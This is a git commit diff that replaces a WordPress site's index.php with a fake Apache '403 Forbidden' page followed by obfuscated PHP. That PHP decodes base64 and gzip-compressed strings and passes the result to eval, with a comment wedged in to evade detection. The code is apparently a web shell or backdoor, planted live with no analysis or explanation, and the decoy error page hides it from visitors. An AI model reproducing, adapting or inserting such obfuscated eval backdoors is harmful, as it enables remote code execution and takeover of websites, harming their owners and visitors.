58f1f0fd045f26c0bef25e7cdad4d14a4d018fa4
kennn404 <kennn4013@gmail.com>
2024-12-13 01:57:53 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,17 +1,22 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at jurnalpaudindonesia.org///Port 555</address>
+</body></html>
+
+
+
+
+
+
+
 <?php
-/
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require DIR . '/wp-blog-header.php';
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "==gbCEnph6fzReD75f/4WjVFRfostd/67/Xs7WdhNt+J5vbq4yuYuT0D6sosqjp6D/o/6oNv9uZ9jpG5I5H5+nlzVZ0Alz4/tkA9s99s6zFETJbkt3iS07bUIpgwq95+fpd8mijRY2feObBxtk1gWVVm16TeI0de47IFHxCwQqMYWqkXwlhUDEZeLIdC6TQKVkvtAVaSV15MajL+SChHpWnpOx2GQaTt3Bq9oeDQthUWt1trUhTY2WOGG6G1dWmlsHLnNK7G4ltPW30f9gwQC1Hj0Mdj0MK13X6OGejrjWY1fvXz2uqSgxfHpa9lboA77hqvIHggDeBR2ou+76WZlbK6gMwfwSpOw61RiPSDpcMExdEBjDwoL98WHARUE8xd/5bCbmpJnVQiLwxxVAFseda69COTAlmiHR39UnLJoqaCbRZ76IqMwaVC3ZcsOR0nZ/LsxR52PmG8ZEH1i5asXDVUyE01a7MRVPMhjzElwFOhaSb3g7KApv+6pus4Bn1apZWziav0hbqu4dYUT/KxbPj5skFyQpSpxQBZ9GqUOAXWrFJSFewRFYaXRyZJZFF98esMUpDACJ7guOJKtz0N7qGWPzJrL/xXOMXOMPMP2+yOPQzs3lmAB2Qf/XV3z2ksDoGcDhNyU2/L0FaIDohUgUpSB6vUm0HEwMqbbPVxcin/FEg+BwJe9rvAFEQ/1LgCB0P8C8QA";
+eval/********/(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
